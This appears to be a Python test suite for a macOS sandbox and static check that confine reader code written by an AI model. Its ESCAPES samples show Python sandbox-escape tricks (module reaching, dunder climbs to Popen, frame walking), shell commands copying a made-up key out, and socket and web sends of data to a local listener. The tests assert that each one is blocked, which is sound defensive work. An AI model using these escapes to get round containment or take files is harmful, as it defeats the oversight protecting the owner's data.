"""Readers the owner's model writes: the check before they run, and the sandbox they run in.

Each reader below is one I wrote to get out: at a file outside the app's folders, at the network, at another program,
at the archive. Two things are shown for each: the check refuses it, and when the check is switched off the macos
sandbox still stops it. The second is what the safety rests on. Made-up data only."""
import json, os, shutil, socket, sys, tempfile, threading, unittest
from tests import fixture
from ctx import connect, paths, sandbox

MAC = sys.platform == "darwin" and os.access(sandbox.TOOL, os.X_OK)

GOOD = '''
import json, os, glob, sqlite3, shutil, tempfile
def read(days, emit):
    for p in sorted(glob.glob(os.path.join(ROOT, "*.json"))):
        with open(p) as f:
            d = json.load(f)
        emit({"id": d["id"], "ts": d["ts"], "title": d["title"], "text": d["text"]})
    tmp = tempfile.mkdtemp()
    shutil.copy2(os.path.join(ROOT, "notes.db"), os.path.join(tmp, "copy.db"))
    for rid, text in sqlite3.connect(os.path.join(tmp, "copy.db")).execute("select id, text from notes"):
        emit({"id": "db%s" % rid, "ts": 1700000000, "title": "from the database", "text": text})
'''

# name -> code. {ROOT} is the app's folder, {SECRET} a file outside it, {OUT} a path outside it to write, {PORT} a listener on this mac.
ESCAPES = {
    "a module reached through another module": '''
import re
def read(days, emit):
    sp = re.enum.sys.modules["sub" + "process"]
    sp._USE_POSIX_SPAWN = False
    emit({"id": "1", "ts": 1, "title": "t", "text": sp.Popen(["/bin/cat", SECRET], stdout=-1).communicate()[0].decode()})
''',
    "os reached through os.path": '''
import os
def read(days, emit):
    fd = os.path.os.open(SECRET, 0)
    emit({"id": "1", "ts": 1, "title": "t", "text": os.path.os.read(fd, 4096).decode()})
''',
    "a file written through os.path.os": '''
import os
def read(days, emit):
    o = os.path.os
    fd = o.open(OUT, o.O_WRONLY | o.O_CREAT, 0o644)
    o.pwrite(fd, b"owned", 0)
    emit({"id": "1", "ts": 1, "title": "t", "text": "wrote it"})
''',
    "the real open, taken from the runner": '''
import re
def read(days, emit):
    main = re.enum.sys.modules["__main__"]
    emit({"id": "1", "ts": 1, "title": "t", "text": main.real_open(SECRET).read()})
''',
    "a frame reached through a generator": '''
def read(days, emit):
    g = (x for x in [1])
    opener = g.gi_frame.f_back.f_globals["real_open"]
    emit({"id": "1", "ts": 1, "title": "t", "text": opener(SECRET).read()})
''',
    "the raw socket module": '''
import re
def read(days, emit):
    s = re.enum.sys.modules["_soc" + "ket"].socket()
    s.connect(("127.0.0.1", PORT))
    s.sendall(b"private words")
    emit({"id": "1", "ts": 1, "title": "t", "text": "sent it"})
''',
    "a web request": '''
import re
def read(days, emit):
    imp = re.enum.sys.modules["importlib"].import_module
    got = imp("urllib.request").urlopen("http://127.0.0.1:%d/?d=private+words" % PORT, timeout=5).read()
    emit({"id": "1", "ts": 1, "title": "t", "text": "sent it"})
''',
    "a module handed on under another name": '''
import os
def read(days, emit):
    m = [os][0]
    fd = m.open(SECRET, 0)
    emit({"id": "1", "ts": 1, "title": "t", "text": m.read(fd, 4096).decode()})
''',
    "a path built from pieces": '''
import os
def read(days, emit):
    p = os.sep.join(SECRET.split(os.sep))
    emit({"id": "1", "ts": 1, "title": "t", "text": open(p).read()})
''',
    "the database opened behind the guard": '''
import sqlite3
def read(days, emit):
    con = sqlite3.dbapi2.connect(OUT)
    con.execute("cre" + "ate table t (x)")
    con.commit()
    emit({"id": "1", "ts": 1, "title": "t", "text": "made a file"})
''',
    "a shell through posix": '''
import re
def read(days, emit):
    px = re.enum.sys.modules["posix"]
    pid = px.fork()
    if pid == 0:
        px.execv("/bin/sh", ["sh", "-c", "cat '%s' > '%s'" % (SECRET, OUT)])
    px.waitpid(pid, 0)
    emit({"id": "1", "ts": 1, "title": "t", "text": "ran it"})
''',
    "a copy out of the folder": '''
import shutil, os
def read(days, emit):
    shutil.copyfile(os.path.join(ROOT, "a.json"), OUT)
    emit({"id": "1", "ts": 1, "title": "t", "text": "copied it"})
''',
    "the archive itself": '''
import os
def read(days, emit):
    emit({"id": "1", "ts": 1, "title": "t", "text": open(ARCHIVE).read()})
''',
    "a format string that reaches in": '''
def read(days, emit):
    emit({"id": "1", "ts": 1, "title": "t", "text": "{0.__globals__}".format(emit)})
''',
    "a dunder climb": '''
def read(days, emit):
    for c in ().__class__.__base__.__subclasses__():
        if c.__name__ == "Popen":
            c(["/bin/sh", "-c", "cat '%s' > '%s'" % (SECRET, OUT)]).wait()
    emit({"id": "1", "ts": 1, "title": "t", "text": "ran it"})
''',
    "a class of its own": '''
class A:
    pass
def read(days, emit):
    emit({"id": "1", "ts": 1, "title": "t", "text": "x"})
''',
}


class Readers(unittest.TestCase):
    def setUp(self):
        self.base = os.path.realpath(tempfile.mkdtemp(prefix="ctx-sbx-"))
        self.addCleanup(shutil.rmtree, self.base, True)
        self.root = os.path.join(self.base, "AppData")
        os.mkdir(self.root)
        import sqlite3
        for i in (1, 2):
            with open(os.path.join(self.root, "%s.json" % "ab"[i - 1]), "w") as f:
                json.dump({"id": "n%d" % i, "ts": 1700000000 + i, "title": "note %d" % i, "text": "a made-up note number %d" % i}, f)
        con = sqlite3.connect(os.path.join(self.root, "notes.db"))
        con.execute("create table notes (id integer, text text)")
        con.execute("insert into notes values (1, 'a line kept in a database')")
        con.commit()
        con.close()
        self.secret = os.path.join(self.base, "outside", "id_made_up")
        os.mkdir(os.path.dirname(self.secret))
        with open(self.secret, "w") as f:
            f.write("MADE-UP-PRIVATE-KEY-0000")
        self.out = os.path.join(self.base, "outside", "planted.txt")
        self.archive = os.path.join(paths.HOME, "messages.jsonl")
        with open(self.archive, errors="replace") as f:                # the made-up archive is there to be read; no reader may come back with it
            self.line = json.loads(f.readline())["text"][:30]
        self.assertGreater(len(self.line), 8)
        self.heard = []
        self.srv = socket.socket()
        self.srv.bind(("127.0.0.1", 0))
        self.srv.listen(5)
        self.srv.settimeout(0.2)
        self.port = self.srv.getsockname()[1]
        self.stop = False

        def listen():
            while not self.stop:
                try:
                    c, _ = self.srv.accept()
                    self.heard.append(1)
                    c.close()
                except OSError:
                    pass
        threading.Thread(target=listen, daemon=True).start()
        self.addCleanup(lambda: (setattr(self, "stop", True), self.srv.close()))
        self.rows = os.path.join(self.base, "rows.jsonl")

    def code(self, body):
        head = "ROOT = %r\n" % self.root
        if body is not GOOD:
            head += "SECRET = %r\nOUT = %r\nARCHIVE = %r\nPORT = %d\n" % (self.secret, self.out, self.archive, self.port)
        lines = body.strip("\n").split("\n")
        at = max([i for i, l in enumerate(lines) if l.startswith(("import ", "from "))] + [-1]) + 1
        return "\n".join(lines[:at]) + "\n" + head + "\n".join(lines[at:]) + "\n"

    def got(self):
        try:
            with open(self.rows) as f:
                return f.read()
        except OSError:
            return ""

    def test_the_check_refuses_every_escape(self):
        for name, body in ESCAPES.items():
            code = self.code(body)
            why = connect.vet(code, [self.root])
            self.assertTrue(why, name)
            self.assertIn("refused", connect.run_code(code, "probe", [self.root], None, self.rows)["error"], name)

    def test_the_check_still_lets_an_honest_reader_through(self):
        self.assertEqual(connect.vet(self.code(GOOD), [self.root]), [])

    @unittest.skipUnless(MAC, "the sandbox is a macos thing")
    def test_an_honest_reader_reads_its_folder_inside_the_sandbox(self):
        res = connect.run_code(self.code(GOOD), "probe", [self.root], None, self.rows)
        self.assertEqual((res["rows"], res["error"]), (3, ""))
        rows = [json.loads(l) for l in self.got().splitlines()]
        self.assertEqual([r["id"] for r in rows], ["Xprobe:n1", "Xprobe:n2", "Xprobe:db1"])
        self.assertEqual({r["src"] for r in rows}, {"custom_probe"})

    @unittest.skipUnless(MAC, "the sandbox is a macos thing")
    def test_with_the_check_switched_off_the_sandbox_still_holds(self):
        """The same escapes, run for real with no vetting at all. None reads the file outside, writes outside, reaches the
        listener, starts a program or reads the archive."""
        self.assertTrue(sandbox.available())
        for name, body in ESCAPES.items():
            for p in (self.out, self.rows):
                if os.path.exists(p):
                    os.remove(p)
            res = connect.run_code(self.code(body), "probe", [self.root], None, self.rows, limit=30, vetted=False)
            got = self.got()
            self.assertNotIn("MADE-UP-PRIVATE-KEY", got, name)
            self.assertNotIn(self.line, got, name)
            self.assertFalse(os.path.exists(self.out), name)
            self.assertEqual(self.heard, [], name)
            if name in ("os reached through os.path", "the raw socket module", "the archive itself", "a path built from pieces"):
                self.assertIn("Error", res["error"], name)             # the kernel said no, and the reader saw it as an error at that line

    @unittest.skipUnless(MAC, "the sandbox is a macos thing")
    def test_the_rules_one_by_one(self):
        probe = lambda src: sandbox.run(["-c", src], read=[self.root], write=[os.path.join(self.base, "work")], timeout=30)
        os.mkdir(os.path.join(self.base, "work"))
        ok = probe("print(open(%r).read()[:1]); open(%r, 'w').write('x'); print('fine')" % (os.path.join(self.root, "a.json"), os.path.join(self.base, "work", "w.txt")))
        self.assertIn("fine", ok.stdout)
        for name, src in (("read outside", "open(%r).read()" % self.secret), ("write outside", "open(%r, 'w').write('x')" % self.out),
                          ("write into the app's folder", "open(%r, 'w').write('x')" % os.path.join(self.root, "new.json")),
                          ("list the home folder", "import os; os.listdir(os.path.expanduser('~'))"),
                          ("read the archive", "open(%r).read()" % self.archive),
                          ("connect out", "import socket; socket.create_connection(('127.0.0.1', %d), 3)" % self.port),
                          ("look up a name", "import socket; socket.getaddrinfo('example.com', 443)"),
                          ("listen", "import socket; s = socket.socket(); s.bind(('127.0.0.1', 0)); s.listen(1)"),
                          ("start a shell", "import subprocess; subprocess.run(['/bin/sh', '-c', 'true'], check=True)"),
                          ("start curl", "import subprocess; subprocess.run(['/usr/bin/curl', '--version'], check=True)"),
                          ("ask applescript", "import subprocess; subprocess.run(['/usr/bin/osascript', '-e', 'return 1'], check=True)")):
            r = probe(src)
            self.assertNotEqual(r.returncode, 0, name)
            self.assertRegex(r.stderr, "PermissionError|Operation not permitted|gaierror|OSError|not permitted", name)
        self.assertEqual(self.heard, [])
        self.assertFalse(os.path.exists(self.out))
        self.assertFalse(os.path.exists(os.path.join(self.root, "new.json")))

    @unittest.skipUnless(MAC, "the sandbox is a macos thing")
    def test_what_lies_outside_cannot_even_be_looked_at(self):
        """Not its size, not whether it is there: a reader cannot map the disk it may not read."""
        work = os.path.join(self.base, "work")
        os.mkdir(work)
        probe = lambda src: sandbox.run(["-c", src], read=[self.root], write=[work], timeout=30)
        seen = probe("import os; print(os.path.exists(%r), os.path.exists(%r), os.path.exists(%r), os.stat(%r).st_size > 0)" % (self.secret, self.archive, os.path.expanduser("~/.ssh"), os.path.join(self.root, "a.json")))
        self.assertEqual(seen.stdout.split(), ["False", "False", "False", "True"], seen.stderr[-300:])      # inside its folder it sees; outside, nothing is there as far as it can tell
        for name, src in (("the size of a file outside", "import os; os.stat(%r)" % self.secret), ("the size of the archive", "import os; os.stat(%r)" % self.archive),
                          ("a listing of the folder outside", "import os; os.listdir(%r)" % os.path.dirname(self.secret)),
                          ("a listing of the folder above its own", "import os; os.listdir(%r)" % self.base),
                          ("a listing of /Users", "import os; os.listdir('/Users')"), ("a listing of /Applications", "import os; os.listdir('/Applications')"),
                          ("a look at a folder outside", "import os; os.lstat('/Users/Shared')")):
            r = probe(src)
            self.assertNotEqual(r.returncode, 0, name)
            self.assertRegex(r.stderr, "PermissionError|Operation not permitted", name)

    @unittest.skipUnless(MAC, "the sandbox is a macos thing")
    def test_no_other_program_beside_python_can_be_started(self):
        import glob
        others = [p for p in sorted(glob.glob(os.path.join(os.path.realpath(sys.base_prefix), "bin", "*")))
                  if os.access(p, os.X_OK) and os.path.realpath(p) not in {os.path.realpath(x) for x in sandbox._python_programs(sys.executable)}]
        if not others:
            self.skipTest("this python ships no other program beside it")
        for other in others[:3]:
            r = sandbox.run(["-c", "import subprocess; subprocess.run([%r, '--version'], check=True)" % other], timeout=30)
            self.assertNotEqual(r.returncode, 0, other)
            self.assertRegex(r.stderr, "PermissionError|Operation not permitted", other)
        for name, src in (("python itself, started again", "import subprocess, sys; subprocess.run([sys.executable, '-I', '-c', 'print(6 * 7)'], check=True)"),
                          ("a fork", "import os; os.fork()"), ("a spawn", "import os; os.posix_spawn('/bin/echo', ['echo', 'x'], {})")):
            r = sandbox.run(["-c", src], timeout=30)                    # no new process at all, not even a second python
            self.assertNotEqual(r.returncode, 0, name)
            self.assertRegex(r.stderr, "PermissionError|Operation not permitted", name)
            self.assertNotIn("42", r.stdout)

    @unittest.skipUnless(MAC, "the sandbox is a macos thing")
    def test_the_machines_own_name_and_settings_are_not_told(self):
        r = sandbox.run(["-c", "import os, socket, platform; print([os.cpu_count(), socket.gethostname(), platform.node()])"], timeout=30)
        self.assertNotIn(socket.gethostname().split(".")[0] or "no-name", r.stdout + r.stderr)
        r = sandbox.run(["-c", "import subprocess; subprocess.run(['/usr/sbin/sysctl', '-n', 'kern.hostname'], check=True)"], timeout=30)
        self.assertNotEqual(r.returncode, 0)

    def test_the_rules_as_written(self):
        """The profile itself, read as text: every allow is one of the kinds the module says, on any mac."""
        import re
        with self.assertRaises(TypeError):
            sandbox.profile(network=True)                               # there is no switch for the network
        for python in (sys.executable, "/opt/homebrew/bin/python3", "/usr/local/bin/python3", "/usr/bin/python3"):
            text = sandbox.profile(read=[self.root], write=[os.path.join(self.base, "work")], python=python)
            lines = text.split("\n")
            self.assertEqual(lines[:2], ["(version 1)", "(deny default)"])
            self.assertEqual(lines[-1], "(deny network*)")
            self.assertNotIn("allow network", text)
            allows = [l for l in lines if l.startswith("(allow ")]
            self.assertEqual(len(allows), len(lines) - 3)
            kinds = [re.match(r"\(allow ([a-z*\-]+)", l).group(1) for l in allows]
            self.assertEqual(sorted(kinds), sorted(["process-exec", "file-read-metadata", "file-read*", "file-write-data", "file-read*", "file-write*"]))
            self.assertNotIn("(allow file-read-metadata)", text)          # a look is allowed at named folders only
            for l in allows:
                if l.startswith(("(allow process-exec", "(allow file-read-metadata", "(allow file-write-data")):
                    self.assertNotIn("subpath", l)                        # single files and single folders, never a tree
            writes = re.findall(r'\(subpath "([^"]+)"\)', [l for l in allows if l.startswith("(allow file-write*")][0])
            self.assertEqual(writes, [os.path.join(self.base, "work")])
            reads = re.findall(r'\(subpath "([^"]+)"\)', [l for l in allows if l.startswith("(allow file-read* (subpath")][0])
            home = os.path.realpath(os.path.expanduser("~"))
            for p in reads:
                self.assertNotIn(p, ("/", "/Users", "/private", "/private/var", "/opt/homebrew", "/usr/local", "/usr", "/Library", "/Applications", home, paths.HOME), p)
                self.assertFalse(paths.HOME.startswith(p + "/"), p)       # the archive is under nothing that may be read
            if python.startswith("/opt/homebrew/"):
                self.assertIn("/opt/homebrew/Cellar", reads)
                self.assertNotIn("/opt/homebrew/var", reads)
                self.assertNotIn("/opt/homebrew/etc", reads)

    @unittest.skipUnless(MAC, "the sandbox is a macos thing")
    def test_nothing_of_the_owners_environment_goes_in(self):
        os.environ["CTX_MADE_UP_TOKEN"] = "made-up-token-value"
        try:
            r = sandbox.run(["-c", "import os; print(sorted(os.environ))"], timeout=30)
        finally:
            del os.environ["CTX_MADE_UP_TOKEN"]
        self.assertNotIn("CTX_MADE_UP_TOKEN", r.stdout)
        self.assertNotIn("PYTHONPATH", r.stdout)

    def test_with_no_sandbox_nothing_runs(self):
        from unittest import mock
        with mock.patch.object(sandbox, "available", lambda python=None: False):
            res = connect.run_code(self.code(GOOD), "probe", [self.root], None, self.rows)
        self.assertEqual(res["rows"], 0)
        self.assertIn("sandbox could not be started", res["error"])
        self.assertEqual(self.got(), "")

    def test_a_saved_reader_that_was_changed_is_not_run(self):
        from unittest import mock
        d = os.path.join(self.base, "custom")
        os.mkdir(d)
        import hashlib
        code = self.code(GOOD)
        with open(os.path.join(d, "probe.py"), "w") as f:
            f.write(code)
        with open(os.path.join(d, "probe.json"), "w") as f:
            json.dump({"kind": "docs", "folders": [self.root], "sha256": hashlib.sha256(code.encode()).hexdigest()}, f)
        with mock.patch.object(connect, "CUSTOM", d):
            self.assertEqual(connect._checked("probe")[0], code)
            with open(os.path.join(d, "probe.py"), "a") as f:
                f.write("\n# one line more\n")
            with self.assertRaises(PermissionError):
                connect._checked("probe")


if __name__ == "__main__":
    unittest.main()
